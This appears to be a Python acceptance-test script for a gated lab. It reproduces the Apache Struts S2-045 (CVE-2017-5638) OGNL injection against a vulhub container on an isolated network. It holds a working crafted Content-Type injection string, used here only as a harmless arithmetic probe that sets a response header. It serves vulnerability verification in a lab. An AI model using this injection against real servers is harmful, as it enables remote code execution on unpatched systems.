#!/usr/bin/env python3
"""Phase 3 acceptance: real Apache Struts S2-045 / CVE-2017-5638 (OGNL RCE capability).

Gated: deploys nothing unless CR_PHASE3_AUTHORIZED=1 and the isolation guard passes.

Safe observable (vulhub canonical arithmetic probe): a crafted Content-Type header
makes Struts evaluate the OGNL expression 233*233 and add the result as a response
header `vulhub: 54289`. A benign request produces no such header. No payload, file
write, or shell is used — only proof that attacker-controlled OGNL is evaluated.
"""
from __future__ import annotations

import sys
import time
from datetime import datetime, timezone

import poc_common as pc

CHAIN = "struts-s2-045"
PROJECT = "cr-poc-struts"
COMPOSE = "compose.struts.yml"

# vulhub's arithmetic verification Content-Type (233*233 == 54289).
OGNL_PROBE = ("%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']"
              ".addHeader('vulhub',233*233)}.multipart/form-data")


def _request(content_type: str) -> dict:
    # Issue the request from the attacker container, capturing the response header
    # the OGNL expression would set. urllib lowercases header access.
    script = (
        "import urllib.request\n"
        "r=urllib.request.Request('http://struts2:8080/', data=b'', headers={'Content-Type': %r})\n"
        "try:\n"
        " resp=urllib.request.urlopen(r, timeout=8)\n"
        " print('vulhub-header=' + str(resp.headers.get('vulhub')))\n"
        "except Exception as e:\n"
        " print('request-error=' + type(e).__name__ + ':' + str(e))" % content_type
    )
    r = pc.run(pc.compose(PROJECT, COMPOSE) + ["exec", "-T", "attacker", "python", "-c", script], timeout=30)
    return {"stdout": (r.stdout or r.stderr).strip()}


def main() -> int:
    blocked = pc.preflight(CHAIN)
    if blocked:
        return pc.finish(blocked)

    result = {"chain": CHAIN, "run_at": datetime.now(timezone.utc).isoformat(), "steps": []}
    try:
        up = pc.run(pc.compose(PROJECT, COMPOSE) + ["up", "-d"], timeout=600)
        if up.returncode != 0:
            result.update({"status": "NOT_TESTED", "reason": "compose up failed: " + up.stderr[-400:]})
            return pc.finish(result)
        if not pc.wait_tcp(PROJECT, COMPOSE, "attacker", "struts2", 8080, 120):
            result.update({"status": "NOT_TESTED", "reason": "struts2 did not become reachable"})
            return pc.finish(result)
        time.sleep(3)

        benign = _request("application/x-www-form-urlencoded")
        result["steps"].append({"step": "benign", "observed": benign["stdout"],
                                "expected": "vulhub-header=None", "ok": "vulhub-header=None" in benign["stdout"]})

        crafted = _request(OGNL_PROBE)
        ok = "vulhub-header=54289" in crafted["stdout"]
        result["steps"].append({"step": "ognl_arithmetic_probe", "injection": OGNL_PROBE,
                                "observed": crafted["stdout"], "expected": "vulhub-header=54289", "ok": ok})

        result["status"] = "PASS" if (ok and result["steps"][0]["ok"]) else "FAIL"
        result["fidelity"] = {
            "reproduced": ["S2-045 OGNL evaluation (RCE capability)"] if result["status"] == "PASS" else [],
            "real_target": "vulhub/struts2:2.3.30 (real CVE-2017-5638)",
            "observable": "response header vulhub=54289 proves attacker OGNL is evaluated; "
                          "no payload/file/shell used.",
            "safety": "isolation guard confirmed host+internet unreachable before deploy; internal network only.",
        }
        return pc.finish(result)
    finally:
        pc.run(pc.compose(PROJECT, COMPOSE) + ["down", "-v", "--remove-orphans"], timeout=90)


if __name__ == "__main__":
    sys.exit(main())
